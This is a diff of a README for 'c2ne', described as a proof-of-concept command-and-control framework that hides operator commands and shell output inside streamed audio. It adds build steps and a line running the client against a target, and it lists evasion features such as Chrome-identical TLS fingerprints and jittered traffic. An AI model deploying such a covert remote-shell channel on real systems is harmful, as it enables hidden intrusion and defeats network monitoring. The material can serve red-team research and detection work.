@@ -3,7 +3,11 @@ A covert command-and-control POC framework, that enclosed operator commands into
 
 > **Educational / Research Use Only.** This tool is intended for authorised red team engagements, CTF competitions, and security research in controlled environments. Do not use against systems you do not have explicit written permission to test.
 
+## Setup
 ```sh
+openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -sha256 -days 365 -nodes -subj "/CN=c2ne.local"
+sudo apt install nginx
+#edit the config file
 GOOS=linux GOARCH=amd64 go build -o server server.go wav_heaer_helper.go aes-gcm_engine.go
 GOOS=linux GOARCH=amd64 go build -o client client.go aes-gcm_engine.go
 
@@ -11,11 +15,12 @@ GOOS=linux GOARCH=amd64 go build -o client client.go aes-gcm_engine.go
 #transfer the client to target
 ./client -target <IP>
 ```
+To edit the config, refer [config](nginx_config.md)
 Table of contents?
 
 ## Overview
 c2ne hides C2 traffic inside what looks like a Chrome browser streaming music from a self-hosted service. The operator commands from the server, and shell output from the client are encrypted and encoded bit-by-bit into the LSB of audio bytes. No separate C2 channel exists on the wire. The only observable traffic is what appeats to be a user listening to son, with periodic scrobble POSTs and track uploads.
-**Key Properties**
+**Features**
 - TLS fingerprint identical to Chrome(uTLS `HelloChrome_Auto`)
 - HTTP/1.1 with handcrafted authentically-ordered Chrome headers on both client and server.
 - Jittered GET request, proportional to realistic streaming chunk consumption
